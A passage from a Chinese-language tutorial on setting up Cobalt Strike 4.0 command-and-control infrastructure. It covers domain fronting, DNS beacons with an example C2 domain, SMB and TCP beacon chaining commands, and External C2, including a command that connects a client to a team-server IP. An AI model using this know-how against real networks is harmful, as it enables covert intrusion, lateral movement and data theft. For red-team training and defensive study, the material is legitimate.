class="cs9C1B1871">告诉了</span><span class="cs8926E06">CDN</span><span class="cs9C1B1871">这个</span><span class="cs8926E06">HTTPS</span><span class="cs9C1B1871">请求应该发给谁（实际</span><span class="cs8926E06">SNI</span><span class="cs9C1B1871">的值与</span><span class="cs8926E06">Host</span><span class="cs9C1B1871">的内容一致），然后</span><span class="cs8926E06">CDN</span><span class="cs9C1B1871">监测到了就会纠正这个</span><span class="cs8926E06">HTTPS</span><span class="cs9C1B1871">请求</span></p><p class="cs3A447A38"><span class="cs9FB05234"># SNI</span><span class="cs7FFD2630">举例：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Extension: server_name</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Type: server_name (0x0000)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Length: 19</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Server Name Indication extension</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Server Name list length: 17</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Server Name Type: host_name (0)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Server Name length: 14</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Server Name: www.github.com</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">现在如果你想做</span><span class="cs9FB05234">Domain Fronting</span><span class="cs9C1B1871">，那么可以直接在添加</span><span class="cs8926E06">Listener</span><span class="cs9C1B1871">的时候设置</span><span class="cs9FB05234">HTTP Host Header</span><span class="cs9C1B1871">（可以参考</span><span class="cs8926E06">0x04</span><span class="cs9C1B1871">添加</span><span class="cs8926E06">Listener</span><span class="cs9C1B1871">那张图）。</span></p><h2 class="cs868C439D">
			<a name="X8c2ef6ab82413e641799d921309cf84a8a02f42"><span class="csB2D98684">0x06 Server Consolidation(</span><span class="cs83F14626">巩固服务器</span><span class="csB2D98684">)</span></a></h2>
		<p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image10.png" width="560" height="328" alt="" style="border-width:0px;" /></span></p><ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs9C1B1871">在</span><span class="cs8926E06">Cobal Strike4</span><span class="cs9C1B1871">中，你可以定义多个</span><span class="cs8926E06">egress listener</span><span class="cs9C1B1871">（相当于内网入口）</span></li><li class="cs63189908"><span class="cs8926E06">HTTP Port(Bind)</span><span class="cs9C1B1871">用于以下场景：</span><span class="cs9FB05234">Redirector</span><span class="cs9C1B1871">使用</span><span class="cs8926E06">80</span><span class="cs9C1B1871">端口，</span><span class="cs8926E06">HTTP C2</span><span class="cs9C1B1871">则使用另外一个端口（即当前设置项的内容），实际流量是从</span><span class="cs8926E06">Redirector</span><span class="cs9C1B1871">的</span><span class="cs8926E06">80</span><span class="cs9C1B1871">端口进入，然后再转发到你设置的这个</span><span class="cs8926E06">listener</span><span class="cs9C1B1871">绑定的端口</span></li><li class="cs63189908"><span class="cs9C1B1871">现在每一个</span><span class="cs8926E06">listener</span><span class="cs9C1B1871">都有一个可修改的的配置文件</span></li><li class="cs63189908"><span class="cs9C1B1871">现在可以配置多个</span><span class="cs8926E06">TCP</span><span class="cs9C1B1871">和</span><span class="cs8926E06">SMB listener</span><span class="cs9C1B1871">了</span></li></ol>
		<h2 class="cs868C439D">
			<a name="Xa3068c7a8903f41eb25b7b1163e754b711e90cb"><span class="csB2D98684">0x07 DNS Beacon</span></a></h2>
		<h3 class="cs868C439D">
			<a name="Xb085ec473dbec08c885dd9a338f59e814de091a"><span class="csD1E291E2">1. </span><span class="csD6CA00D2">介绍</span><span class="csD1E291E2">DNS Beacon</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs8926E06">DNS beacon</span><span class="cs9C1B1871">是通过</span><span class="cs8926E06">DNS</span><span class="cs9C1B1871">解析来访问</span><span class="cs8926E06">Cobal Strike Team Server</span><span class="cs9C1B1871">的，所以运行</span><span class="cs8926E06">Cobal Strike Team Server</span><span class="cs9C1B1871">的服务器需要关闭本地的，运行</span><span class="cs8926E06">Beacon</span><span class="cs9C1B1871">的主机会将</span><span class="cs8926E06">beacon</span><span class="cs9C1B1871">的标识符伪装成一个子域名。</span><span class="cs8926E06"><br/><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image11.png" width="560" height="337" alt="" style="border-width:0px;" /><br/>DNS Beacon</span><span class="cs9C1B1871">举例：</span></p><ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs8926E06">DNS Beacon</span><span class="cs9C1B1871">向本地</span><span class="cs8926E06">DNS</span><span class="cs9C1B1871">缓存查询是否有域名</span><span class="cs9FB05234">1234.profiles.losenolove.com</span><span class="cs9C1B1871">的解析记录</span></li><li class="cs63189908"><span class="cs9C1B1871">本地缓存未查询到时，本地</span><span class="cs8926E06">DNS</span><span class="cs9C1B1871">服务器将会向根服务器请求解析该域名，根域名服务器发现域名是</span><span class="cs9FB05234">.com</span><span class="cs9C1B1871">的域名，便指示本地</span><span class="cs8926E06">DNS</span><span class="cs9C1B1871">服务器去</span><span class="cs9FB05234">.com</span><span class="cs9C1B1871">域名服务器查询</span></li><li class="cs63189908"><span class="cs9FB05234">.com</span><span class="cs9C1B1871">服务器收到解析请求后将解析请求转发给网站注册的域名服务器（此处是</span><span class="cs8926E06">godaddy</span><span class="cs9C1B1871">）</span></li><li class="cs63189908"><span class="cs9C1B1871">网站注册的域名服务器再将解析请求转发给</span><span class="cs9FB05234">losenolove.com</span><span class="cs9C1B1871">的网站服务器（</span><span class="cs9FB05234">Cobal Strike Team Server</span><span class="cs9C1B1871">）</span></li><li class="cs63189908"><span class="cs9FB05234">Cobal Strike Team Server</span><span class="cs9C1B1871">收到解析请求后检查是否存在与该域名相关的任务在运行，如果有，通常情况下</span><span class="cs8926E06">Team Server</span><span class="cs9C1B1871">会将</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">放置到响应内容中返回给本地</span><span class="cs8926E06">DNS</span><span class="cs9C1B1871">服务器，本地</span><span class="cs8926E06">DNS</span><span class="cs9C1B1871">服务器再转给</span><span class="cs8926E06">DNS Beacon</span><span class="cs9C1B1871">；</span></li><li class="cs63189908"><span class="cs8926E06">DNS Beacon</span><span class="cs9C1B1871">执行完相关命令后，将数据加密后再放置到一个子域名中（类似</span><span class="cs9FB05234">1234.profiles.losenolove.com</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">1234</span><span class="cs9C1B1871">），然后再对该子域名发送</span><span class="cs8926E06">DNS</span><span class="cs9C1B1871">解析请求</span></li></ol>
		<p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image12.png" width="560" height="336" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">这里相比</span><span class="cs8926E06">CS3</span><span class="cs9C1B1871">而言，</span><span class="cs8926E06">CS4</span><span class="cs9C1B1871">的</span><span class="cs8926E06">DNS Beacon</span><span class="cs9C1B1871">可以设置</span><span class="cs9FB05234">Redirector</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">DNS Stager host</span><span class="cs9C1B1871">可以用于设置</span><span class="cs9FB05234">Redirector</span><span class="cs9C1B1871">，</span><span class="cs9FB05234">Port(Bind)</span><span class="cs9C1B1871">可以用于</span><span class="cs8926E06">redirector</span><span class="cs9C1B1871">的其他端口</span><span class="cs8926E06">(</span><span class="cs9C1B1871">默认为</span><span class="cs8926E06">53</span><span class="cs9C1B1871">端口</span><span class="cs8926E06">)</span><span class="cs9C1B1871">，而</span><span class="cs9FB05234">Cobal Strike Team Server</span><span class="cs9C1B1871">则使用</span><span class="cs8926E06">53</span><span class="cs9C1B1871">端口</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image13.png" width="560" height="240" alt="" style="border-width:0px;" /></span><span class="cs8926E06">&nbsp;</span><span class="cs9C1B1871">鉴于</span><span class="cs8926E06">HTTP</span><span class="cs9C1B1871">可能存在无法访问的风险，新的</span><span class="cs8926E06">DNS Beacon</span><span class="cs9C1B1871">将不再使用</span><span class="cs8926E06">HTTP</span><span class="cs9C1B1871">通道，即不再使用</span><span class="cs8926E06">HTTP</span><span class="cs9C1B1871">下载</span><span class="cs8926E06">Payload</span><span class="cs9C1B1871">，默认将使用</span><span class="cs9FB05234">dns-txt</span><span class="cs9C1B1871">通道通过</span><span class="cs8926E06">DNS txt</span><span class="cs9C1B1871">记录解析传输至</span><span class="cs8926E06">Cobal Strike Team Server</span><span class="cs9C1B1871">，然后通过</span><span class="cs8926E06">DNS A</span><span class="cs9C1B1871">请求返回</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">。在</span><span class="cs8926E06">Beacon</span><span class="cs9C1B1871">的操作终端上可以切换通道（</span><span class="cs8926E06">channel</span><span class="cs9C1B1871">）。但是</span><span class="cs8926E06">DNS</span><span class="cs9C1B1871">请求内容和返回内容限制了长度，所以</span><span class="cs8926E06">dns-txt</span><span class="cs9C1B1871">会最大化使用域名长度（根据配置设定）</span><span class="cs8926E06">,</span><span class="cs9FB05234">dns-txt</span><span class="cs9C1B1871">也是相对而言最好的。而</span><span class="cs8926E06">dns</span><span class="cs9C1B1871">和</span><span class="cs8926E06">dns6</span><span class="cs9C1B1871">则会对这种域名进行截断，因为在某些网络里，非常长的域名将会被自动拦截。</span></p><h3 class="cs868C439D">
			<a name="X3358a8be025148c7faa051e5b457a2b6a388df9"><span class="csD1E291E2">2. </span><span class="csD6CA00D2">实现一个</span><span class="csD1E291E2">DNS Beacon</span></a></h3>
		<p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image14.png" width="560" height="329" alt="" style="border-width:0px;" /></span><span class="cs8926E06">&nbsp;</span><span class="cs9C1B1871">准备工作：</span></p><ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs9C1B1871">申请一个域名并创建一个</span><span class="cs8926E06">A</span><span class="cs9C1B1871">记录给你的</span><span class="cs8926E06">Cobal Strike Team Server</span><span class="cs9C1B1871">（即域名解析为</span><span class="cs8926E06">IP</span><span class="cs9C1B1871">）</span></li><li class="cs63189908"><span class="cs9C1B1871">创建一个</span><span class="cs8926E06">NS</span><span class="cs9C1B1871">记录给你申请的域名（解析子域名）</span></li></ol>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">实例举例：</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">　　</span><span class="cs8926E06">Team Server</span><span class="cs9C1B1871">域名：</span><span class="cs8926E06">malwarec2.losenolove.com<br/></span><span class="cs9C1B1871">　　创建一个</span><span class="cs8926E06">DNS Beacon listener:<br/><br/>linux</span><span class="cs9C1B1871">下可使用</span><span class="cs9FB05234">dig +trace [</span><span class="cs7FFD2630">域名</span><span class="cs9FB05234">]</span><span class="cs9C1B1871">查看域名的解析过程</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">在目标主机执行</span><span class="cs8926E06">powershell</span><span class="cs9C1B1871">一句话执行</span><span class="cs8926E06">DNS Beacon</span><span class="cs9C1B1871">，</span><span class="cs8926E06">Team Server</span><span class="cs9C1B1871">结果如下：</span><span class="cs8926E06"><br/><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image15.png" width="560" height="202" alt="" style="border-width:0px;" /><br/></span><span class="cs9C1B1871">界面上没有主机信息显示是因为没有发送测试数据，可以直接右键点击</span><span class="cs9FB05234">Interact</span><span class="cs9C1B1871">进行交互后获得主机信息。可以使用</span><span class="cs9FB05234">sleep 5</span><span class="cs9C1B1871">修改心跳时间（默认</span><span class="cs8926E06">1min</span><span class="cs9C1B1871">）</span><span class="cs8926E06"><br/><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image16.png" width="560" height="208" alt="" style="border-width:0px;" /><br/>DNS</span><span class="cs9C1B1871">通道是一个被限制数据大小的通道，如果需要传输大文件，那么可能需要通过发起多次</span><span class="cs8926E06">DNS</span><span class="cs9C1B1871">解析请求来传输，比如执行截图命令、执行</span><span class="cs8926E06">Mimikatz</span><span class="cs9C1B1871">，这将消耗很长时间。</span></p><h2 class="cs868C439D">
			<a name="X7857e9b7dc41ddfe2cbe5279fa7b3c48b50196b"><span class="csB2D98684">0x08 SMB Beacon</span></a></h2>
		<h3 class="cs868C439D">
			<a name="Xe1546f586a2c5ff4dcd97796a4cebf937296b36"><span class="csD1E291E2">1. </span><span class="csD6CA00D2">介绍</span><span class="csD1E291E2">SMB Beacon</span></a></h3>
		<p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image17.png" width="560" height="451" alt="" style="border-width:0px;" /></span><span class="cs8926E06"><br/>SMB Beacon</span><span class="cs9C1B1871">使用命名管道通过父级</span><span class="cs8926E06">Beacon</span><span class="cs9C1B1871">进行通讯，当两个</span><span class="cs8926E06">Beacon</span><span class="cs9C1B1871">连接后，子</span><span class="cs8926E06">Beacon</span><span class="cs9C1B1871">从父</span><span class="cs8926E06">Beacon</span><span class="cs9C1B1871">获取到任务并发送。因为连接的</span><span class="cs8926E06">Beacons</span><span class="cs9C1B1871">使用</span><span class="cs8926E06">Windows</span><span class="cs9C1B1871">命名管道进行通信，此流量封装在</span><span class="cs8926E06">SMB</span><span class="cs9C1B1871">协议中通过</span><span class="cs8926E06">445</span><span class="cs9C1B1871">端口进行传输。</span></p><h3 class="cs868C439D">
			<a name="X82513bfd142fbd0fc002ef16abe0e55d50bab3a"><span class="csD1E291E2">2. </span><span class="csD6CA00D2">创建</span><span class="csD1E291E2">SMB Beacon Listener</span></a></h3>
		<p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image18.png" width="560" height="327" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="X19d8728ba7dedd64b8fb80ab050d9114f5a1223"><span class="csD1E291E2">3. </span><span class="csD6CA00D2">连接和断连</span><span class="csD1E291E2">SMB Beacon</span></a></h3>
		<p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image19.png" width="560" height="312" alt="" style="border-width:0px;" /></span><span class="cs8926E06">&nbsp;</span><span class="cs9C1B1871">在</span><span class="cs8926E06">Beacon</span><span class="cs9C1B1871">控制台上输入</span><span class="cs9FB05234">link [host] [pipe name]</span><span class="cs9C1B1871">命令进行连接</span><span class="cs8926E06">Beacon</span><span class="cs9C1B1871">操作，输入</span><span class="cs9FB05234">unlink [host] [pid]</span><span class="cs9C1B1871">命令进行断连</span><span class="cs8926E06">Beacon</span><span class="cs9C1B1871">操作。如果你断开了当前</span><span class="cs8926E06">Beacon</span><span class="cs9C1B1871">的连接，那么它与它的子级</span><span class="cs8926E06">Beacon</span><span class="cs9C1B1871">也会断开连接。而这个子级</span><span class="cs8926E06">Beacon</span><span class="cs9C1B1871">将会进入到一个等待父级</span><span class="cs8926E06">Beacon</span><span class="cs9C1B1871">连接的状态。当你连接到一个</span><span class="cs8926E06">Beacon</span><span class="cs9C1B1871">时，可能会出现错误代码提示，上图举例说明了几个。</span></p><table class="cs2D2816FE" border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse;">
			<tr>
				<td class="csC48167EA" valign="bottom"><p class="csA622D344"><span class="cs9C1B1871">错误代码</span></p></td><td class="csC48167EA" valign="bottom"><p class="csA622D344"><span class="cs9C1B1871">名称</span></p></td><td class="csC48167EA" valign="bottom"><p class="csE0FE76B"><span class="cs9C1B1871">描述</span></p></td></tr>
			<tr>
				<td class="csE35A2CA7" valign="top"><p class="csA622D344"><span class="cs8926E06">2</span></p></td><td class="csE35A2CA7" valign="top"><p class="csA622D344"><span class="cs8926E06">File Not Found</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs9C1B1871">没有可以连接的</span><span class="cs8926E06">Beacon</span></p></td></tr>
			<tr>
				<td class="csE35A2CA7" valign="top"><p class="csA622D344"><span class="cs8926E06">5</span></p></td><td class="csE35A2CA7" valign="top"><p class="csA622D344"><span class="cs8926E06">Access is Denied</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs9C1B1871">你没有权限连接到这个</span><span class="cs8926E06">Beacon/</span><span class="cs9C1B1871">这个命名管道，如果是在远程主机上，那么你的</span><span class="cs8926E06">access token</span><span class="cs9C1B1871">可能无效或者没有权限访问，也可能是该管道被系统锁定了</span></p></td></tr>
			<tr>
				<td class="csE35A2CA7" valign="top"><p class="csA622D344"><span class="cs8926E06">53</span></p></td><td class="csE35A2CA7" valign="top"><p class="csA622D344"><span class="cs8926E06">Bad Netpath</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs9C1B1871">说明</span><span class="cs8926E06">Beacon</span><span class="cs9C1B1871">与目标服务器并没有建立通信关系，只能说明目标服务器没有任何响应给你</span></p></td></tr>
		</table>
		<h3 class="cs868C439D">
			<a name="X6dd13f2866509eb3a6904498182756de2411171"><span class="csD1E291E2">3. </span><span class="csD6CA00D2">创建一个</span><span class="csD1E291E2">SMB</span><span class="csD6CA00D2">实例</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">接着上面的</span><span class="cs8926E06">DNS Beacon</span><span class="cs9C1B1871">执行如下操作：</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">创建一个</span><span class="cs8926E06">Cobal Strike Listener</span><span class="cs9C1B1871">：</span><span class="cs8926E06"><br/><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image20.png" width="524" height="219" alt="" style="border-width:0px;" /><br/></span><span class="cs9C1B1871">执行权限提升：</span><span class="cs8926E06"><br/><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image21.png" width="560" height="108" alt="" style="border-width:0px;" /><br/><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image22.png" width="419" height="195" alt="" style="border-width:0px;" /><br/>payload</span><span class="cs9C1B1871">将会通过</span><span class="cs8926E06">DNS Beacon</span><span class="cs9C1B1871">传输并执行。</span><span class="cs8926E06"> <img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image23.png" width="560" height="211" alt="" style="border-width:0px;" /><br/></span><span class="cs9C1B1871">如果想要图形化地查看</span><span class="cs8926E06">Beacon</span><span class="cs9C1B1871">的关系，可以点击</span><span class="cs8926E06">Cobal Strike - Visualization &gt; Pivot Graph</span><span class="cs9C1B1871">进行查看</span><span class="cs8926E06"><br/><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image24.png" width="560" height="289" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="X8204ff9cb1e72fac3b6f035a3aa68945603170c"><span class="csB2D98684">0x09 TCP Beacon</span></a></h2>
		<h3 class="cs868C439D">
			<a name="X7422b485150381977dfc2cf0246e3820af17fe9"><span class="csD1E291E2">1. </span><span class="csD6CA00D2">介绍</span><span class="csD1E291E2">TCP Beacon</span></a></h3>
		<p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image25.png" width="560" height="330" alt="" style="border-width:0px;" /></span><span class="cs8926E06"><br/>TCP Beacon</span><span class="cs9C1B1871">和</span><span class="cs8926E06">SMB Beacon</span><span class="cs9C1B1871">很像，它也可以被一个父级</span><span class="cs8926E06">Beacon</span><span class="cs9C1B1871">所控制，父级</span><span class="cs8926E06">Beacon</span><span class="cs9C1B1871">可以是</span><span class="cs8926E06">TCP Beacon</span><span class="cs9C1B1871">，也可以是</span><span class="cs8926E06">SMB Beacon</span><span class="cs9C1B1871">。这里的</span><span class="cs9FB05234">Bind to localhost only</span><span class="cs9C1B1871">用于你需要使用</span><span class="cs8926E06">TCP Beacon</span><span class="cs9C1B1871">进行主机渗透的权限提升或者横向渗透的情况。</span></p><h3 class="cs868C439D">
			<a name="Xd7630411fb948ead4ec3ff598a4cb68b35a1128"><span class="csD1E291E2">2. </span><span class="csD6CA00D2">连接和断开</span><span class="csD1E291E2">Beacon</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234"># </span><span class="cs7FFD2630">连接到一个</span><span class="cs9FB05234">TCP Beacon</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">connect [host] [port]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">断连一个</span><span class="cs9FB05234">TCP Beacon</span><span class="cs7FFD2630">，断连后将进入一个等待连接的状态</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">unlink [host] [pid]</span></p><h3 class="cs868C439D">
			<a name="X974c6f19cbe184f311172d93770c597cb7a46fd"><span class="csD1E291E2">3. </span><span class="csD6CA00D2">实例演示</span><span class="csD1E291E2">TCP Beacon</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">基于之前的</span><span class="cs8926E06">DNS Beacon </span><span class="cs9C1B1871">创建</span><span class="cs8926E06">Listener</span><span class="cs9C1B1871">：</span><span class="cs8926E06"><br/><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image26.png" width="516" height="180" alt="" style="border-width:0px;" /> DNS Beacon</span><span class="cs9C1B1871">执行</span><span class="cs8926E06">Spawn as<br/><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image27.png" width="560" height="247" alt="" style="border-width:0px;" /> </span><span class="cs9C1B1871">手动设置</span><span class="cs8926E06"><br/><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image28.png" width="560" height="387" alt="" style="border-width:0px;" /><br/>payload</span><span class="cs9C1B1871">也是通过</span><span class="cs8926E06">DNS Beacon</span><span class="cs9C1B1871">传输的</span><span class="cs8926E06"><br/><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image29.png" width="560" height="217" alt="" style="border-width:0px;" /><br/></span><span class="cs9C1B1871">橙色的线代表连接的是</span><span class="cs8926E06">SMB Beacon</span><span class="cs9C1B1871">，蓝绿色的线则代表</span><span class="cs8926E06">TCP Beacon</span></p><h2 class="cs868C439D">
			<a name="X5f4a1bf86c55b83e2c65452763453ee5e54ede7"><span class="csB2D98684">0xA External C2</span></a></h2>
		<h3 class="cs868C439D">
			<a name="X575e916804acb048bc404193a1e6cc112b32415"><span class="csD1E291E2">1. </span><span class="csD6CA00D2">介绍</span><span class="csD1E291E2">External C2</span></a></h3>
		<p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image30.png" width="560" height="413" alt="" style="border-width:0px;" /></span><span class="cs8926E06"><br/>ExternalC2</span><span class="cs9C1B1871">是由</span><span class="cs8926E06">Cobalt Strike</span><span class="cs9C1B1871">提出的一套规范</span><span class="cs8926E06">/</span><span class="cs9C1B1871">框架，它允许用户根据需要对框架提供的默认</span><span class="cs8926E06">HTTP(S)/DNS/SMB C2 </span><span class="cs9C1B1871">通信通道进行扩展。</span></p><ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs9C1B1871">第三方控制器</span><span class="cs8926E06">:</span><span class="cs9C1B1871">负责创建与</span><span class="cs8926E06">Cobalt Strike TeamServer</span><span class="cs9C1B1871">的连接，并使用自定义</span><span class="cs8926E06">C2</span><span class="cs9C1B1871">通道与目标主机上的第三方客户端进行通信。</span></li><li class="cs63189908"><span class="cs9C1B1871">第三方客户端</span><span class="cs8926E06">:</span><span class="cs9C1B1871">负责使用自定义的</span><span class="cs8926E06">C2</span><span class="cs9C1B1871">通道与第三方控制器进行通信，并将命令中转到</span><span class="cs8926E06">SMB Beacon</span><span class="cs9C1B1871">。</span></li><li class="cs63189908"><span class="cs8926E06">SMB Beacon:</span><span class="cs9C1B1871">在受害者机器上运行的标准</span><span class="cs8926E06">Beacon</span><span class="cs9C1B1871">。</span></li></ol>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">深入学习可参考</span></p><p class="cs40DD2BC9"><span class="cs8926E06"><a class="cs508254C" href="https://xz.aliyun.com/t/2239"><span class="cs1C2E50E7">深入探索</span><span class="cs4B51D5E4">Cobalt Strike</span><span class="cs1C2E50E7">的</span><span class="cs4B51D5E4">ExternalC2</span><span class="cs1C2E50E7">框架</span></a></span></p><p class="cs40DD2BC9"><span class="cs8926E06"><a class="cs508254C" href="https://www.Cobal%20Strike.com/help-externalc2"><span class="cs4B51D5E4">external C2</span><span class="cs1C2E50E7">官方帮助文档</span></a></span></p><h3 class="cs868C439D">
			<a name="X450525873bbbc8e273b087b64de9f3fbaa5e094"><span class="csD1E291E2">2. </span><span class="csD6CA00D2">实例演示</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">此处使用官方示例程序进行演示，具体程序编译过程此处省略。</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">创建监听器：</span><span class="cs8926E06"><br/><br/>windows</span><span class="cs9C1B1871">执行编译好的程序连接</span><span class="cs8926E06">Cobalt Strike Team Server</span><span class="cs9C1B1871">：</span><span class="cs9FB05234">example.exe 54.80.166.26 2222</span><span class="cs8926E06"><br/>Cobalt Strike Team Server</span><span class="cs9C1B1871">收到</span><span class="cs8926E06">Session</span><span class="cs9C1B1871">：</span><span class="cs8926E06"><br/></span></p></body>
</html>
